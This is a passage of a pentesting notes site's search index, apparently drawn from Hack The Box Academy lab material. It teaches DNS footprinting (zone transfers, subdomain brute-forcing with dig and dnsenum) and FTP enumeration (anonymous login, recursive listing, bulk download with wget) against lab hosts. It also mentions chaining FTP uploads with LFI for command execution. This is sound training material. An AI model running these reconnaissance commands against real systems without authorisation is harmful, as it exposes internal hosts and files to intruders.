14.129.10.in-addr.arpa\n$TTL 86400\n@     IN     SOA    dns1.domain.com.     hostmaster.domain.com. (\n                    2001062501 ; serial\n                    21600      ; refresh after 6 hours\n                    3600       ; retry after 1 hour\n                    604800     ; expire after 1 week\n                    86400 )    ; minimum TTL of 1 day\n\n      IN     NS     ns1.domain.com.\n      IN     NS     ns2.domain.com.\n\n5    IN     PTR    server1.domain.com.\n7    IN     MX     mx.domain.com.\n...SNIP...\n</code></pre>","tags":["Pentesting","Information_Gathering","DNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/DNS%20%2853%29/Footprinting%20the%20Service/","title":"Footprinting the Service","text":"<p>The footprinting at DNS servers is done as a result of the requests we send. So, first of all, the DNS server can be queried as to which other name servers are known. We do this using the NS record and the specification of the DNS server we want to query using the <code>@</code> character. This is because if there are other DNS servers, we can also use them and query the records. However, other DNS servers may be configured differently and, in addition, may be permanent for other zones.</p>","tags":["Pentesting","Information_Gathering","DNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/DNS%20%2853%29/Footprinting%20the%20Service/#dns-tools","title":"DNS Tools","text":"Tool Key Features Use Cases <code>dig</code> Versatile DNS lookup tool that supports various query types (A, MX, NS, TXT, etc.) and detailed output. Manual DNS queries, zone transfers (if allowed), troubleshooting DNS issues, and in-depth analysis of DNS records. <code>nslookup</code> Simpler DNS lookup tool, primarily for A, AAAA, and MX records. Basic DNS queries, quick checks of domain resolution and mail server records. <code>host</code> Streamlined DNS lookup tool with concise output. Quick checks of A, AAAA, and MX records. <code>dnsenum</code> Automated DNS enumeration tool, dictionary attacks, brute-forcing, zone transfers (if allowed). Discovering subdomains and gathering DNS information efficiently. <code>fierce</code> DNS reconnaissance and subdomain enumeration tool with recursive search and wildcard detection. User-friendly interface for DNS reconnaissance, identifying subdomains and potential targets. <code>dnsrecon</code> Combines multiple DNS reconnaissance techniques and supports various output formats. Comprehensive DNS enumeration, identifying subdomains, and gathering DNS records for further analysis. <code>theHarvester</code> OSINT tool that gathers information from various sources, including DNS records (email addresses). Collecting email addresses, employee information, and other data associated with a domain from multiple sources. Online DNS Lookup Services User-friendly interfaces for performing DNS lookups. Quick and easy DNS lookups, convenient when command-line tools are not available, checking for domain availability or basic information","tags":["Pentesting","Information_Gathering","DNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/DNS%20%2853%29/Footprinting%20the%20Service/#dig-ns-query","title":"DIG - NS Query","text":"<pre><code>arenwald@htb[/htb]$ dig ns inlanefreight.htb @10.129.14.128\n\n; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; ns inlanefreight.htb @10.129.14.128\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 45010\n;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 4096\n; COOKIE: ce4d8681b32abaea0100000061475f73842c401c391690c7 (good)\n;; QUESTION SECTION:\n;inlanefreight.htb.             IN      NS\n\n;; ANSWER SECTION:\ninlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.\n\n;; ADDITIONAL SECTION:\nns.inlanefreight.htb.   604800  IN      A       10.129.34.136\n\n;; Query time: 0 msec\n;; SERVER: 10.129.14.128#53(10.129.14.128)\n;; WHEN: So Sep 19 18:04:03 CEST 2021\n;; MSG SIZE  rcvd: 107\n</code></pre> <p>Sometimes it is also possible to query a DNS server's version using a class CHAOS query and type TXT. However, this entry must exist on the DNS server. For this, we could use the following command:</p>","tags":["Pentesting","Information_Gathering","DNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/DNS%20%2853%29/Footprinting%20the%20Service/#dig-version-query","title":"DIG - Version Query","text":"<pre><code>arenwald@htb[/htb]$ dig CH TXT version.bind 10.129.120.85\n\n; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; CH TXT version.bind\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 47786\n;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; ANSWER SECTION:\nversion.bind.       0       CH      TXT     \"9.10.6-P1\"\n\n;; ADDITIONAL SECTION:\nversion.bind.       0       CH      TXT     \"9.10.6-P1-Debian\"\n\n;; Query time: 2 msec\n;; SERVER: 10.129.120.85#53(10.129.120.85)\n;; WHEN: Wed Jan 05 20:23:14 UTC 2023\n;; MSG SIZE  rcvd: 101\n</code></pre> <p>We can use the option <code>ANY</code> to view all available records. This will cause the server to show us all available entries that it is willing to disclose. It is important to note that not all entries from the zones will be shown.</p>","tags":["Pentesting","Information_Gathering","DNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/DNS%20%2853%29/Footprinting%20the%20Service/#dig-any-query","title":"DIG - ANY Query","text":"<pre><code>arenwald@htb[/htb]$ dig any inlanefreight.htb @10.129.14.128\n\n; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; any inlanefreight.htb @10.129.14.128\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 7649\n;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 2\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 4096\n; COOKIE: 064b7e1f091b95120100000061476865a6026d01f87d10ca (good)\n;; QUESTION SECTION:\n;inlanefreight.htb.             IN      ANY\n\n;; ANSWER SECTION:\ninlanefreight.htb.      604800  IN      TXT     \"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all\"\ninlanefreight.htb.      604800  IN      TXT     \"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU\"\ninlanefreight.htb.      604800  IN      TXT     \"MS=ms97310371\"\ninlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800\ninlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.\n\n;; ADDITIONAL SECTION:\nns.inlanefreight.htb.   604800  IN      A       10.129.34.136\n\n;; Query time: 0 msec\n;; SERVER: 10.129.14.128#53(10.129.14.128)\n;; WHEN: So Sep 19 18:42:13 CEST 2021\n;; MSG SIZE  rcvd: 437\n</code></pre> <p><code>Zone transfer</code> refers to the transfer of zones to another server in DNS, which generally happens over TCP port 53. This procedure is abbreviated <code>Asynchronous Full Transfer Zone</code> (<code>AXFR</code>). Since a DNS failure usually has severe consequences for a company, the zone file is almost invariably kept identical on several name servers. When changes are made, it must be ensured that all servers have the same data. Synchronization between the servers involved is realized by zone transfer. Using a secret key <code>rndc-key</code>, which we have seen initially in the default configuration, the servers make sure that they communicate with their own master or slave. Zone transfer involves the mere transfer of files or records and the detection of discrepancies in the data sets of the servers involved.</p> <p>The original data of a zone is located on a DNS server, which is called the <code>primary</code> name server for this zone. However, to increase the reliability, realize a simple load distribution, or protect the primary from attacks, one or more additional servers are installed in practice in almost all cases, which are called <code>secondary</code> name servers for this zone. For some <code>Top-Level Domains</code> (<code>TLDs</code>), making zone files for the <code>Second Level Domains</code> accessible on at least two servers is mandatory.</p> <p>DNS entries are generally only created, modified, or deleted on the primary. This can be done by manually editing the relevant zone file or automatically by a dynamic update from a database. A DNS server that serves as a direct source for synchronizing a zone file is called a master. A DNS server that obtains zone data from a master is called a slave. A primary is always a master, while a secondary can be both a slave and a master.</p> <p>The slave fetches the <code>SOA</code> record of the relevant zone from the master at certain intervals, the so-called refresh time, usually one hour, and compares the serial numbers. If the serial number of the SOA record of the master is greater than that of the slave, the data sets no longer match.</p>","tags":["Pentesting","Information_Gathering","DNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/DNS%20%2853%29/Footprinting%20the%20Service/#dig-axfr-zone-transfer","title":"DIG - AXFR Zone Transfer","text":"<pre><code>arenwald@htb[/htb]$ dig axfr inlanefreight.htb @10.129.14.128\n\n; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; axfr inlanefreight.htb @10.129.14.128\n;; global options: +cmd\ninlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800\ninlanefreight.htb.      604800  IN      TXT     \"MS=ms97310371\"\ninlanefreight.htb.      604800  IN      TXT     \"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU\"\ninlanefreight.htb.      604800  IN      TXT     \"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all\"\ninlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.\napp.inlanefreight.htb.  604800  IN      A       10.129.18.15\ninternal.inlanefreight.htb. 604800 IN   A       10.129.1.6\nmail1.inlanefreight.htb. 604800 IN      A       10.129.18.201\nns.inlanefreight.htb.   604800  IN      A       10.129.34.136\ninlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800\n;; Query time: 4 msec\n;; SERVER: 10.129.14.128#53(10.129.14.128)\n;; WHEN: So Sep 19 18:51:19 CEST 2021\n;; XFR size: 9 records (messages 1, bytes 520)\n</code></pre> <p>If the administrator used a subnet for the <code>allow-transfer</code> option for testing purposes or as a workaround solution or set it to <code>any</code>, everyone would query the entire zone file at the DNS server. In addition, other zones can be queried, which may even show internal IP addresses and hostnames.</p>","tags":["Pentesting","Information_Gathering","DNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/DNS%20%2853%29/Footprinting%20the%20Service/#dig-axfr-zone-transfer-internal","title":"DIG - AXFR Zone Transfer - Internal","text":"<pre><code>arenwald@htb[/htb]$ dig axfr internal.inlanefreight.htb @10.129.14.128\n\n; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; axfr internal.inlanefreight.htb @10.129.14.128\n;; global options: +cmd\ninternal.inlanefreight.htb. 604800 IN   SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800\ninternal.inlanefreight.htb. 604800 IN   TXT     \"MS=ms97310371\"\ninternal.inlanefreight.htb. 604800 IN   TXT     \"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU\"\ninternal.inlanefreight.htb. 604800 IN   TXT     \"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all\"\ninternal.inlanefreight.htb. 604800 IN   NS      ns.inlanefreight.htb.\ndc1.internal.inlanefreight.htb. 604800 IN A     10.129.34.16\ndc2.internal.inlanefreight.htb. 604800 IN A     10.129.34.11\nmail1.internal.inlanefreight.htb. 604800 IN A   10.129.18.200\nns.internal.inlanefreight.htb. 604800 IN A      10.129.34.136\nvpn.internal.inlanefreight.htb. 604800 IN A     10.129.1.6\nws1.internal.inlanefreight.htb. 604800 IN A     10.129.1.34\nws2.internal.inlanefreight.htb. 604800 IN A     10.129.1.35\nwsus.internal.inlanefreight.htb. 604800 IN A    10.129.18.2\ninternal.inlanefreight.htb. 604800 IN   SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800\n;; Query time: 0 msec\n;; SERVER: 10.129.14.128#53(10.129.14.128)\n;; WHEN: So Sep 19 18:53:11 CEST 2021\n;; XFR size: 15 records (messages 1, bytes 664)\n</code></pre> <p>The individual <code>A</code> records with the hostnames can also be found out with the help of a brute-force attack. To do this, we need a list of possible hostnames, which we use to send the requests in order. Such lists are provided, for example, by SecLists.</p> <p>An option would be to execute a <code>for-loop</code> in Bash that lists these entries and sends the corresponding query to the desired DNS server.</p>","tags":["Pentesting","Information_Gathering","DNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/DNS%20%2853%29/Record%20Types/","title":"Record Types","text":"<p>Different <code>DNS records</code> are used for the DNS queries, which all have various tasks. Moreover, separate entries exist for different functions since we can set up mail servers and other servers for a domain.</p> Record Type Full Name Description Zone File Example <code>A</code> Address Record Maps a hostname to its IPv4 address. <code>www.example.com.</code> IN A <code>192.0.2.1</code> <code>AAAA</code> IPv6 Address Record Maps a hostname to its IPv6 address. <code>www.example.com.</code> IN AAAA <code>2001:db8:85a3::8a2e:370:7334</code> <code>CNAME</code> Canonical Name Record Creates an alias for a hostname, pointing it to another hostname. <code>blog.example.com.</code> IN CNAME <code>webserver.example.net.</code> <code>MX</code> Mail Exchange Record Specifies the mail server(s) responsible for handling email for the domain. <code>example.com.</code> IN MX 10 <code>mail.example.com.</code> <code>NS</code> Name Server Record Delegates a DNS zone to a specific authoritative name server. <code>example.com.</code> IN NS <code>ns1.example.com.</code> <code>TXT</code> Text Record Stores arbitrary text information, often used for domain verification or security policies. <code>example.com.</code> IN TXT <code>\"v=spf1 mx -all\"</code> (SPF record) <code>SOA</code> Start of Authority Record Specifies administrative information about a DNS zone, including the primary name server, responsible person's email, and other parameters. <code>example.com.</code> IN SOA <code>ns1.example.com. admin.example.com. 2024060301 10800 3600 604800 86400</code> <code>SRV</code> Service Record Defines the hostname and port number for specific services. <code>_sip._udp.example.com.</code> IN SRV 10 5 5060 <code>sipserver.example.com.</code> <code>PTR</code> Pointer Record Used for reverse DNS lookups, mapping an IP address to a hostname. <code>1.2.0.192.in-addr.arpa.</code> IN PTR <code>www.example.com.</code> <p>The <code>SOA</code> record is located in a domain's zone file and specifies who is responsible for the operation of the domain and how DNS information for the domain is managed.</p> <pre><code>arenwald@htb[/htb]$ dig soa www.inlanefreight.com\n\n; &lt;&lt;&gt;&gt; DiG 9.16.27-Debian &lt;&lt;&gt;&gt; soa www.inlanefreight.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 15876\n;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 512\n;; QUESTION SECTION:\n;www.inlanefreight.com.         IN      SOA\n\n;; AUTHORITY SECTION:\ninlanefreight.com.      900     IN      SOA     ns-161.awsdns-20.com. awsdns-hostmaster.amazon.com. 1 7200 900 1209600 86400\n\n;; Query time: 16 msec\n;; SERVER: 8.8.8.8#53(8.8.8.8)\n;; WHEN: Thu Jan 05 12:56:10 GMT 2023\n;; MSG SIZE  rcvd: 128\n</code></pre> <p>The dot (.) is replaced by an at sign (@) in the email address. In this example, the email address of the administrator is <code>awsdns-hostmaster@amazon.com</code>.</p>","tags":["Pentesting","Information_Gathering","DNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/DNS%20%2853%29/Server%20Type/","title":"Server Type","text":"Server Type Description <code>DNS Root Server</code> The root servers of the DNS are responsible for the top-level domains (<code>TLD</code>). As the last instance, they are only requested if the name server does not respond. Thus, a root server is a central interface between users and content on the Internet, as it links domain and IP address. The Internet Corporation for Assigned Names and Numbers (<code>ICANN</code>) coordinates the work of the root name servers. There are <code>13</code> such root servers around the globe. <code>Authoritative Nameserver</code> Authoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client's query, the root name server takes over at that point. <code>Non-authoritative Nameserver</code> Non-authoritative name servers are not responsible for a particular DNS zone. Instead, they collect information on specific DNS zones themselves, which is done using recursive or iterative DNS querying. <code>Caching DNS Server</code> Caching DNS servers cache information from other name servers for a specified period. The authoritative name server determines the duration of this storage. <code>Forwarding Server</code> Forwarding servers perform only one function: they forward DNS queries to another DNS server. <code>Resolver</code> Resolvers are not authoritative DNS servers but perform name resolution locally in the computer or router.","tags":["Information_Gathering","Pentesting","DNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/DNS%20%2853%29/Subdomain%20Bruteforcing/","title":"Subdomain Bruteforcing","text":"<p>There are several tools available that excel at brute-force enumeration:</p> Tool Description dnsenum Comprehensive DNS enumeration tool that supports dictionary and brute-force attacks for discovering subdomains. fierce User-friendly tool for recursive subdomain discovery, featuring wildcard detection and an easy-to-use interface. dnsrecon Versatile tool that combines multiple DNS reconnaissance techniques and offers customisable output formats. amass Actively maintained tool focused on subdomain discovery, known for its integration with other tools and extensive data sources. assetfinder Simple yet effective tool for finding subdomains using various techniques, ideal for quick and lightweight scans. puredns Powerful and flexible DNS brute-forcing tool, capable of resolving and filtering results effectively. <pre><code>arenwald@htb[/htb]$ for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\\|SOA' | sed -r '/^\\s*$/d' | grep $sub | tee -a subdomains.txt;done\n\nns.inlanefreight.htb.   604800  IN      A       10.129.34.136\nmail1.inlanefreight.htb. 604800 IN      A       10.129.18.201\napp.inlanefreight.htb.  604800  IN      A       10.129.18.15\n</code></pre> <p>Many different tools can be used for this, and most of them work in the same way. One of these tools is, for example DNSenum.</p> <pre><code>arenwald@htb[/htb]$ dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb\n\ndnsenum VERSION:1.2.6\n\n-----   inlanefreight.htb   -----\n\n\nHost's addresses:\n__________________\n\n\n\nName Servers:\n______________\n\nns.inlanefreight.htb.                    604800   IN    A        10.129.34.136\n\n\nMail (MX) Servers:\n___________________\n\n\n\nTrying Zone Transfers and getting Bind Versions:\n_________________________________________________\n\nunresolvable name: ns.inlanefreight.htb at /usr/bin/dnsenum line 900 thread 1.\n\nTrying Zone Transfer for inlanefreight.htb on ns.inlanefreight.htb ...\nAXFR record query failed: no nameservers\n\n\nBrute forcing with /home/cry0l1t3/Pentesting/SecLists/Discovery/DNS/subdomains-top1million-110000.txt:\n_______________________________________________________________________________________________________\n\nns.inlanefreight.htb.                    604800   IN    A        10.129.34.136\nmail1.inlanefreight.htb.                 604800   IN    A        10.129.18.201\napp.inlanefreight.htb.                   604800   IN    A        10.129.18.15\nns.inlanefreight.htb.                    604800   IN    A        10.129.34.136\n\n...SNIP...\ndone.\n</code></pre>","tags":["Pentesting","Information_Gathering","DNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/FTP%20%2821%29/Active%20vs%20Passive/","title":"Active vs Passive","text":"<p>A distinction is made between\u00a0<code>active</code>\u00a0and\u00a0<code>passive</code>\u00a0FTP. In the active variant, the client establishes the connection as described via TCP port 21 and thus informs the server via which client-side port the server can transmit its responses. However, if a firewall protects the client, the server cannot reply because all external connections are blocked. For this purpose, the\u00a0<code>passive mode</code>\u00a0has been developed. Here, the server announces a port through which the client can establish the data channel. Since the client initiates the connection in this method, the firewall does not block the transfer.</p>","tags":["Pentesting","FTP","Information_Gathering"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/FTP%20%2821%29/Cheat%20Sheet/","title":"Cheat Sheet","text":"Command Description <code>ftp &lt;FQDN/IP&gt;</code> Interact with the FTP service on the target. <code>nc -nv &lt;FQDN/IP&gt; 21</code> Interact with the FTP service on the target. <code>telnet &lt;FQDN/IP&gt; 21</code> Interact with the FTP service on the target. <code>openssl s_client -connect &lt;FQDN/IP&gt;:21 -starttls ftp</code> Interact with the FTP service on the target using encrypted connection. <code>wget -m --no-passive ftp://anonymous:anonymous@&lt;target&gt;</code> Download all available files on the target FTP server.","tags":["Pentesting","Cheat_Sheet","FTP","Information_Gathering"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/FTP%20%2821%29/Dangerous%20settings/","title":"Dangerous settings","text":"<p>There are many different security-related settings we can make on each FTP server. These can have various purposes, such as testing connections through the firewalls, testing routes, and authentication mechanisms. One of these authentication mechanisms is the\u00a0<code>anonymous</code>\u00a0user. This is often used to allow everyone on the internal network to share files and data without accessing each other's computers. With vsFTPd, the\u00a0optional settings\u00a0that can be added to the configuration file for the anonymous login look like this:</p> Setting Description <code>anonymous_enable=YES</code> Allowing anonymous login? <code>anon_upload_enable=YES</code> Allowing anonymous to upload files? <code>anon_mkdir_write_enable=YES</code> Allowing anonymous to create new directories? <code>no_anon_password=YES</code> Do not ask anonymous for password? <code>anon_root=/home/username/ftp</code> Directory for anonymous. <code>write_enable=YES</code> Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE? <p>With the standard FTP client (<code>ftp</code>), we can access the FTP server accordingly and log in with the anonymous user if the settings shown above have been used. The use of the anonymous account can occur in internal environments and infrastructures where the participants are all known. Access to this type of service can be set temporarily or with the setting to accelerate the exchange of files.</p> <p>As soon as we connect to the vsFTPd server, the\u00a0<code>response code 220</code>\u00a0is displayed with the banner of the FTP server. Often this banner contains the description of the\u00a0<code>service</code>\u00a0and even the\u00a0<code>version</code>\u00a0of it. It also tells us what type of system the FTP server is. One of the most common configurations of FTP servers is to allow\u00a0<code>anonymous</code>\u00a0access, which does not require legitimate credentials but provides access to some files. Even if we cannot download them, sometimes just listing the contents is enough to generate further ideas and note down information that will help us in another approach.</p>","tags":["Pentesting","Information_Gathering","FTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/FTP%20%2821%29/Dangerous%20settings/#anonymous-login","title":"Anonymous Login","text":"<pre><code>arenwald@htb[/htb]$ ftp 10.129.14.136\n\nConnected to 10.129.14.136.\n220 \"Welcome to the HTB Academy vsFTP service.\"\nName (10.129.14.136:cry0l1t3): anonymous\n\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\n\n\nftp&gt; ls\n\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\n-rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx\ndrwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Clients\ndrwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents\ndrwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees\n-rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt\n226 Directory send OK.\n</code></pre> <p>However, to get the first overview of the server's settings, we can use the following command:</p>","tags":["Pentesting","Information_Gathering","FTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/FTP%20%2821%29/Dangerous%20settings/#vsftpd-status","title":"vsFTPd Status","text":"<pre><code>ftp&gt; status\n\nConnected to 10.129.14.136.\nNo proxy connection.\nConnecting using address family: any.\nMode: stream; Type: binary; Form: non-print; Structure: file\nVerbose: on; Bell: off; Prompting: on; Globbing: on\nStore unique: off; Receive unique: off\nCase: off; CR stripping: on\nQuote control characters: on\nNtrans: off\nNmap: off\nHash mark printing: off; Use of PORT cmds: on\nTick counter printing: off\n</code></pre> <p>Some commands should be used occasionally, as these will make the server show us more information that we can use for our purposes. These commands include\u00a0<code>debug</code>\u00a0and\u00a0<code>trace</code>.</p>","tags":["Pentesting","Information_Gathering","FTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/FTP%20%2821%29/Dangerous%20settings/#vsftpd-detailed-output","title":"vsFTPd Detailed Output","text":"<pre><code>ftp&gt; debug\n\nDebugging on (debug=1).\n\n\nftp&gt; trace\n\nPacket tracing on.\n\n\nftp&gt; ls\n\n---&gt; PORT 10,10,14,4,188,195\n200 PORT command successful. Consider using PASV.\n---&gt; LIST\n150 Here comes the directory listing.\n-rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx\ndrwxrwxr-x    2 1002     1002         4096 Sep 14 17:03 Clients\ndrwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents\ndrwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees\n-rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt\n226 Directory send OK.\n</code></pre> Setting Description <code>dirmessage_enable=YES</code> Show a message when they first enter a new directory? <code>chown_uploads=YES</code> Change ownership of anonymously uploaded files? <code>chown_username=username</code> User who is given ownership of anonymously uploaded files. <code>local_enable=YES</code> Enable local users to login? <code>chroot_local_user=YES</code> Place local users into their home directory? <code>chroot_list_enable=YES</code> Use a list of local users that will be placed in their home directory? Setting Description <code>hide_ids=YES</code> All user and group information in directory listings will be displayed as \"ftp\". <code>ls_recurse_enable=YES</code> Allows the use of recurse listings. <p>In the following example, we can see that if the\u00a0<code>hide_ids=YES</code>\u00a0setting is present, the UID and GUID representation of the service will be overwritten, making it more difficult for us to identify with which rights these files are written and uploaded.</p>","tags":["Pentesting","Information_Gathering","FTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/FTP%20%2821%29/Dangerous%20settings/#hiding-ids-yes","title":"Hiding IDs - YES","text":"<pre><code>ftp&gt; ls\n\n---&gt; TYPE A\n200 Switching to ASCII mode.\nftp: setsockopt (ignored): Permission denied\n---&gt; PORT 10,10,14,4,223,101\n200 PORT command successful. Consider using PASV.\n---&gt; LIST\n150 Here comes the directory listing.\n-rw-rw-r--    1 ftp     ftp      8138592 Sep 14 16:54 Calender.pptx\ndrwxrwxr-x    2 ftp     ftp         4096 Sep 14 17:03 Clients\ndrwxrwxr-x    2 ftp     ftp         4096 Sep 14 16:50 Documents\ndrwxrwxr-x    2 ftp     ftp         4096 Sep 14 16:50 Employees\n-rw-rw-r--    1 ftp     ftp           41 Sep 14 16:45 Important Notes.txt\n-rw-------    1 ftp     ftp            0 Sep 15 14:57 testupload.txt\n226 Directory send OK.\n</code></pre> <p>This setting is a security feature to prevent local usernames from being revealed. With the usernames, we could attack the services like FTP and SSH and many others with a brute-force attack in theory. However, in reality,\u00a0fail2ban\u00a0solutions are now a standard implementation of any infrastructure that logs the IP address and blocks all access to the infrastructure after a certain number of failed login attempts.</p> <p>Another helpful setting we can use for our purposes is the\u00a0<code>ls_recurse_enable=YES</code>. This is often set on the vsFTPd server to have a better overview of the FTP directory structure, as it allows us to see all the visible content at once.</p>","tags":["Pentesting","Information_Gathering","FTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/FTP%20%2821%29/Dangerous%20settings/#recursive-listing","title":"Recursive Listing","text":"<pre><code>ftp&gt; ls -R\n\n---&gt; PORT 10,10,14,4,222,149\n200 PORT command successful. Consider using PASV.\n---&gt; LIST -R\n150 Here comes the directory listing.\n.:\n-rw-rw-r--    1 ftp      ftp      8138592 Sep 14 16:54 Calender.pptx\ndrwxrwxr-x    2 ftp      ftp         4096 Sep 14 17:03 Clients\ndrwxrwxr-x    2 ftp      ftp         4096 Sep 14 16:50 Documents\ndrwxrwxr-x    2 ftp      ftp         4096 Sep 14 16:50 Employees\n-rw-rw-r--    1 ftp      ftp           41 Sep 14 16:45 Important Notes.txt\n-rw-------    1 ftp      ftp            0 Sep 15 14:57 testupload.txt\n\n./Clients:\ndrwx------    2 ftp      ftp          4096 Sep 16 18:04 HackTheBox\ndrwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:00 Inlanefreight\n\n./Clients/HackTheBox:\n-rw-r--r--    1 ftp      ftp         34872 Sep 16 18:04 appointments.xlsx\n-rw-r--r--    1 ftp      ftp        498123 Sep 16 18:04 contract.docx\n-rw-r--r--    1 ftp      ftp        478237 Sep 16 18:04 contract.pdf\n-rw-r--r--    1 ftp      ftp           348 Sep 16 18:04 meetings.txt\n\n./Clients/Inlanefreight:\n-rw-r--r--    1 ftp      ftp         14211 Sep 16 18:00 appointments.xlsx\n-rw-r--r--    1 ftp      ftp         37882 Sep 16 17:58 contract.docx\n-rw-r--r--    1 ftp      ftp            89 Sep 16 17:58 meetings.txt\n-rw-r--r--    1 ftp      ftp        483293 Sep 16 17:59 proposal.pptx\n\n./Documents:\n-rw-r--r--    1 ftp      ftp         23211 Sep 16 18:05 appointments-template.xlsx\n-rw-r--r--    1 ftp      ftp         32521 Sep 16 18:05 contract-template.docx\n-rw-r--r--    1 ftp      ftp        453312 Sep 16 18:05 contract-template.pdf\n\n./Employees:\n226 Directory send OK.\n</code></pre> <p><code>Downloading</code>\u00a0files from such an FTP server is one of the main features, as well as\u00a0<code>uploading</code>\u00a0files created by us. This allows us, for example, to use LFI vulnerabilities to make the host execute system commands. Apart from the files, we can view, download and inspect. Attacks are also possible with the FTP logs, leading to\u00a0<code>Remote Command Execution</code>\u00a0(<code>RCE</code>). This applies to the FTP services and all those we can detect during our enumeration phase.</p>","tags":["Pentesting","Information_Gathering","FTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/FTP%20%2821%29/Dangerous%20settings/#download-a-file","title":"Download a File","text":"<pre><code>ftp&gt; ls\n\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\n-rwxrwxrwx    1 ftp      ftp             0 Sep 16 17:24 Calendar.pptx\ndrwxrwxrwx    4 ftp      ftp          4096 Sep 16 17:57 Clients\ndrwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:05 Documents\ndrwxrwxrwx    2 ftp      ftp          4096 Sep 16 17:24 Employees\n-rwxrwxrwx    1 ftp      ftp            41 Sep 18 15:58 Important Notes.txt\n226 Directory send OK.\n\n\nftp&gt; get 